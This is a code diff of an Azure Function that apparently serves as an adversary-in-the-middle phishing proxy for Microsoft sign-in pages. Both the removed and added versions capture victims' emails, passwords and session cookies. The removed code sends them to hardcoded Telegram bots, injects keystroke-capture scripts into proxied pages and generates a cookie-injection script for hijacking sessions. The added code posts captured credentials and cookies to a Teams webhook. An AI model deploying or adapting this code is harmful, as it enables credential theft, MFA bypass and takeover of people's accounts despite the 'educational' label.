@@ -1,19 +1,14 @@
 /**
- * Enhanced Azure Function AiTM Phishing PoC for Entra ID accounts.
- * Supports both corporate and personal accounts (hotmail/live).
- * This code is provided for educational purposes only and provided without any liability or warranty.
+ * Azure Function AiTM Phishing PoC for Entra ID accounts.
+ * This code is provided for educational purposes only and provided withou any liability or warranty.
  * Based on: https://github.com/zolderio/AITMWorker
  */
 
 const { app } = require("@azure/functions");
 
 const upstream = "login.microsoftonline.com";
-const upstream_live = "login.live.com";
 const upstream_path = "/";
-const telegram_bot_token_1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
-const telegram_bot_token_2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
-const telegram_chat_id_1 = "6743632244";
-const telegram_chat_id_2 = "6263177378";
+const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;
 
 // headers to delete from upstream responses
 const delete_headers = [
@@ -25,167 +20,13 @@ const delete_headers = [
   "strict-transport-security",
   "content-length",
   "content-encoding",
+  "Set-Cookie",
 ];
 
-const emailMap = new Map();
-
-// COMPLETELY SEPARATE PERSONAL ACCOUNT DETECTION - NEVER AFFECTS CORPORATE
-function isPersonalEmail(email) {
-  if (!email) return false;
-  const personalDomains = ['@outlook.com', '@hotmail.com', '@live.com', '@msn.com'];
-  return personalDomains.some(domain => email.toLowerCase().includes(domain));
-}
-
-// ORIGINAL CORPORATE RESPONSE HANDLER - UNCHANGED
-async function replace_response_text(response, upstream, original, ip) {
-  return response.text().then((text) =>
-    text
-      .replace(new RegExp(upstream, "g"), original)
-      .replace(
-        "</body>",
-        `<script>
-          document.addEventListener('DOMContentLoaded', () => {
-            const interval = setInterval(() => {
-              const btn = document.getElementById("idSIButton9");
-              const emailInput = document.querySelector("input[name='loginfmt']");
-              if (btn && emailInput) {
-                clearInterval(interval);
-                const realIP = "${ip}";
-                btn.addEventListener("click", () => {
-                  fetch("/__notify_click", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                      event: "next_button_clicked",
-                      email: emailInput.value,
-                      ip: realIP
-                    }),
-                  });
-                });
-              }
-            }, 500);
-          });
-        </script></body>`
-      )
-  );
-}
-
-// SEPARATE PERSONAL ACCOUNT RESPONSE HANDLER - NEVER AFFECTS CORPORATE
-async function replace_response_text_personal(response, upstream, original, ip) {
-  return response.text().then((text) => {
-    let modifiedText = text;
-    
-    // AGGRESSIVE URL REWRITING FOR PERSONAL ACCOUNTS - NEVER AFFECTS CORPORATE
-    // Replace all possible domain references
-    modifiedText = modifiedText.replace(new RegExp(upstream, "g"), original);
-    modifiedText = modifiedText.replace(new RegExp("login\\.live\\.com", "g"), original.split('//')[1]);
-    modifiedText = modifiedText.replace(new RegExp("login\\.microsoftonline\\.com", "g"), original.split('//')[1]);
-    
-    // Replace any hardcoded URLs in JavaScript
-    modifiedText = modifiedText.replace(new RegExp('"https://login\\.live\\.com"', "g"), `"${original}"`);
-    modifiedText = modifiedText.replace(new RegExp('"https://login\\.microsoftonline\\.com"', "g"), `"${original}"`);
-    
-    // Advanced JavaScript for personal accounts only
-    const personalJS = `
-      <script>
-        (function() {
-          const realIP = "${ip}";
-          
-          // Enhanced personal account event capture
-          function capturePersonalEvents() {
-            // Capture email entry with multiple selectors
-            const emailInputs = document.querySelectorAll('input[name="loginfmt"], input[name="username"], input[type="email"], input[placeholder*="email"], input[placeholder*="Email"]');
-            emailInputs.forEach(input => {
-              input.addEventListener('input', function() {
-                fetch("/__notify_click", {
-                  method: "POST",
-                  headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify({
-                    event: "email_entered",
-                    email: this.value,
-                    ip: realIP
-                  }),
-                });
-              });
-            });
-            
-            // Capture button clicks
-            const buttons = document.querySelectorAll('button, input[type="submit"], [data-testid*="button"], [id*="button"]');
-            buttons.forEach(btn => {
-              btn.addEventListener('click', function() {
-                fetch("/__notify_click", {
-                  method: "POST",
-                  headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify({
-                    event: "button_clicked",
-                    buttonText: this.textContent || this.value || this.getAttribute('data-testid'),
-                    ip: realIP
-                  }),
-                });
-              });
-            });
-          }
-          
-          // Initialize for personal accounts
-          if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', capturePersonalEvents);
-          } else {
-            capturePersonalEvents();
-          }
-        })();
-      </script>
-    `;
-    
-    return modifiedText.replace("</body>", `${personalJS}</body>`);
-  });
-}
-
-async function dispatchMessage(message, context) {
-  context.log(`📤 Sending to Telegram: ${message}`);
-  
-  // Send to Telegram bot 2 (working one)
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${telegram_bot_token_2}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ 
-        chat_id: telegram_chat_id_2, 
-        text: message, 
-        parse_mode: "HTML" 
-      }),
-    });
-    
-    if (response.ok) {
-      context.log(`✅ Message sent successfully to bot 2`);
-    } else {
-      const errorText = await response.text();
-      context.log(`❌ Failed to send to bot 2: ${errorText}`);
-    }
-  } catch (error) {
-    context.log(`❌ Error sending to bot 2: ${error.message}`);
-  }
-
-  // Try to send to bot 1 (will fail until chat_id is set)
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${telegram_bot_token_1}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ 
-        chat_id: telegram_chat_id_1, // Replace with your actual chat_id
-        text: message, 
-        parse_mode: "HTML" 
-      }),
-    });
-    
-    if (response.ok) {
-      context.log(`✅ Message sent successfully to bot 1`);
-    } else {
-      const errorText = await response.text();
-      context.log(`❌ Failed to send to bot 1: ${errorText}`);
-    }
-  } catch (error) {
-    context.log(`❌ Error sending to bot 1: ${error.message}`);
-  }
+async function replace_response_text(response, upstream, original) {
+  return response
+    .text()
+    .then((text) => text.replace(new RegExp(upstream, "g"), original));
 }
 
 app.http("phishing", {
@@ -193,63 +34,39 @@ app.http("phishing", {
   authLevel: "anonymous",
   route: "/{*x}",
   handler: async (request, context) => {
-    const ip =
-      request.headers.get("cf-connecting-ip") ||
-      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
-      request.headers.get("x-client-ip") ||
-      request.headers.get("true-client-ip") ||
-      request.headers.get("x-real-ip") ||
-      "unknown";
 
-    // Log every request for debugging
-    await dispatchMessage(
-      `🔍 <b>New Request</b>\n🌐 <b>Method</b>: ${request.method}\n📱 <b>IP</b>: ${ip}\n🔗 <b>URL</b>: ${request.url}\n👤 <b>User-Agent</b>: ${request.headers.get("user-agent") || "unknown"}`,
-      context
-    );
-
-    // Handle special injected click reporting
-    if (request.method === "POST" && new URL(request.url).pathname === "/__notify_click") {
-      const body = await request.json();
-      const email = body.email || "unknown";
-      const realIP = body.ip || ip;
-      emailMap.set(realIP, email);
-      await dispatchMessage(
-        `👀 <b>User is ready to enter password</b>\n🧑‍💻 <b>Email</b>: ${email}\n🌐 <b>IP</b>: ${realIP}`,
-        context
-      );
-      return new Response("ok", { status: 200 });
+    async function dispatchMessage(message) {
+      context.log(message);
+      if (teams_webhook_url) {
+        await fetch(teams_webhook_url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ text: message }),
+        })
+          .then((response) =>
+            response.ok
+              ? console.log("successfully dispatched MSG")
+              : console.error(`Failed to dispatch: ${response.statusText}`)
+          )
+          .catch((error) => console.log(error));
+      }
     }
 
     // original URLs
     const upstream_url = new URL(request.url);
     const original_url = new URL(request.url);
 
-    // COMPLETELY SEPARATE PERSONAL ACCOUNT ROUTING - NEVER AFFECTS CORPORATE
-    const storedEmail = emailMap.get(ip);
-    let targetUpstream = upstream; // DEFAULT TO CORPORATE
-    
-    // ONLY change to personal if we have a confirmed personal email
-    if (storedEmail && isPersonalEmail(storedEmail)) {
-      targetUpstream = upstream_live;
-    }
-
-    // Rewriting to appropriate upstream
-    upstream_url.host = targetUpstream;
+    // Rewriting to MSONLINE
+    upstream_url.host = upstream;
     upstream_url.port = 443;
     upstream_url.protocol = "https:";
 
-    // SEPARATE PATHNAME HANDLING FOR PERSONAL ACCOUNTS - NEVER AFFECTS CORPORATE
     if (upstream_url.pathname == "/") {
       upstream_url.pathname = upstream_path;
     } else {
-      // For personal accounts, preserve the original pathname
-      if (targetUpstream === upstream_live) {
-        // Personal account - keep pathname as is
-        upstream_url.pathname = upstream_url.pathname;
-      } else {
-        // Corporate account - use original logic
-        upstream_url.pathname = upstream_path + upstream_url.pathname;
-      }
+      upstream_url.pathname = upstream_path + upstream_url.pathname;
     }
 
     context.log(
@@ -268,37 +85,26 @@ app.http("phishing", {
       original_url.protocol + "//" + original_url.host
     );
 
-    // Capture login credentials
+    // Obtain password from POST body
     if (request.method === "POST") {
       const temp_req = await request.clone();
       const body = await temp_req.text();
       const keyValuePairs = body.split("&");
 
       // extract key-value pairs for username and password
-      const data = Object.fromEntries(
+      const msg = Object.fromEntries(
         keyValuePairs
-          .map((pair) => {
-            const [key, value] = pair.split("=");
-            return [key, decodeURIComponent((value || "").replace(/\+/g, " "))];
-          })
-          .filter(([key]) => key === "loginfmt" || key === "passwd")
+          .map((pair) => ([key, value] = pair.split("=")))
+          .filter(([key, _]) => key == "login" || key == "passwd")
+          .map(([_, value]) => [
+            _,
+            decodeURIComponent(value.replace(/\+/g, " ")),
+          ])
       );
 
-      if (data.loginfmt) {
-        emailMap.set(ip, data.loginfmt);
-        // COMPLETELY SEPARATE PERSONAL ACCOUNT LOGGING - NEVER AFFECTS CORPORATE
-        const isPersonal = isPersonalEmail(data.loginfmt);
-        const accountType = isPersonal ? "personal" : "corporate";
-        await dispatchMessage(
-          `📧 <b>Email Entered</b>\n🧑‍💻 <b>Email</b>: ${data.loginfmt}\n🌐 <b>IP</b>: ${ip}\n🎯 <b>Account Type</b>: ${accountType}`,
-          context
-        );
-      }
-
-      if (data.loginfmt && data.passwd) {
-        await dispatchMessage(
-          `📥 <b>Captured Credentials</b>\n🧑‍💻 <b>Email</b>: ${data.loginfmt}\n🔑 <b>Password</b>: ${data.passwd}\n🌐 <b>IP</b>: ${ip}`,
-          context
+      if (msg.login && msg.passwd) {
+        dispatchMessage(
+          "Captured login information: <br>" + JSON.stringify(msg)
         );
       }
     }
@@ -326,7 +132,7 @@ app.http("phishing", {
     // Replace cookie domains to match our proxy
     try {
       // getSetCookie is the successor of Headers.getAll
-      const originalCookies = original_response.headers.getSetCookie?.() || [];
+      const originalCookies = original_response.headers.getSetCookie();
 
       originalCookies.forEach((originalCookie) => {
         const modifiedCookie = originalCookie.replace(
@@ -336,59 +142,28 @@ app.http("phishing", {
         new_response_headers.append("Set-Cookie", modifiedCookie);
       });
 
-      // Capture important cookies for both corporate and personal accounts
-      const importantCookies = originalCookies.filter((cookie) =>
-        /(ESTSAUTH|ESTSAUTHPERSISTENT|SignInStateCookie|ESTSAUTHLIGHT)=/.test(cookie)
+      const cookies = originalCookies.filter(
+        (cookie) =>
+          cookie.startsWith("ESTSAUTH=") ||
+          cookie.startsWith("ESTSAUTHPERSISTENT=") ||
+          cookie.startsWith("SignInStateCookie=")
       );
 
-      if (importantCookies.length >= 3) {
-        const victimEmail = emailMap.get(ip) || "unknown";
-        const cookieText = importantCookies.map((c) => c.split(";")[0]).join("\n");
-
-        await dispatchMessage(
-          `🍪 <b>Captured Cookies</b> for <b>${victimEmail}</b>\n🌐 <b>IP</b>: ${ip}\n<code>${cookieText}</code>`,
-          context
-        );
-
-        // COMPLETELY SEPARATE PERSONAL ACCOUNT COOKIE DOMAIN - NEVER AFFECTS CORPORATE
-        const storedEmail = emailMap.get(ip);
-        const cookieDomain = (storedEmail && isPersonalEmail(storedEmail)) ? upstream_live : upstream;
-        const cookieScript = generateCookieInjectionScript(importantCookies, cookieDomain);
-        await dispatchMessage(
-          `🔧 <b>Cookie Injection Script</b> for <b>${victimEmail}</b>\n🌐 <b>IP</b>: ${ip}\n<code>${cookieScript}</code>`,
-          context
+      if (cookies.length == 3) {
+        dispatchMessage(
+          "Captured required authentication cookies: <br>" +
+            JSON.stringify(cookies)
         );
       }
     } catch (error) {
-      console.error("Cookie capture error:", error);
-      await dispatchMessage(
-        `❌ <b>Cookie Capture Error</b>\n🌐 <b>IP</b>: ${ip}\n🔍 <b>Error</b>: ${error.message}`,
-        context
-      );
+      console.error(error);
     }
 
-    // SEPARATE RESPONSE HANDLING - NEVER AFFECTS CORPORATE
-    const currentStoredEmail = emailMap.get(ip);
-    const isPersonal = currentStoredEmail && isPersonalEmail(currentStoredEmail);
-    
-    let original_text;
-    if (isPersonal) {
-      // Use personal account handler
-      original_text = await replace_response_text_personal(
-        original_response.clone(),
-        upstream_url.protocol + "//" + upstream_url.host,
-        original_url.protocol + "//" + original_url.host,
-        ip
-      );
-    } else {
-      // Use original corporate handler
-      original_text = await replace_response_text(
-        original_response.clone(),
-        upstream_url.protocol + "//" + upstream_url.host,
-        original_url.protocol + "//" + original_url.host,
-        ip
-      );
-    }
+    const original_text = await replace_response_text(
+      original_response.clone(),
+      upstream_url.protocol + "//" + upstream_url.host,
+      original_url.protocol + "//" + original_url.host
+    );
 
     return new Response(original_text, {
       status: original_response.status,
@@ -396,27 +171,3 @@ app.http("phishing", {
     });
   },
 });
-
-function generateCookieInjectionScript(cookies, domain) {
-  const cookieData = cookies.map(cookie => {
-    const [nameValue] = cookie.split(';');
-    const [name, value] = nameValue.split('=');
-    return {
-      domain: domain,
-      expirationDate: Math.floor(Date.now() / 1000) + 31536000, // 1 year
-      hostOnly: false,
-      httpOnly: true,
-      name: name,
-      path: "/",
-      sameSite: "none",
-      secure: true,
-      session: true,
-      storeId: null,
-      value: value
-    };
-  });
-
-  const script = `!function(){let e=JSON.parse(\`${JSON.stringify(cookieData)}\`);for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}Secure;SameSite=None\`;window.location.href=atob("aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tLw==")}();`;
-  
-  return script;
-}
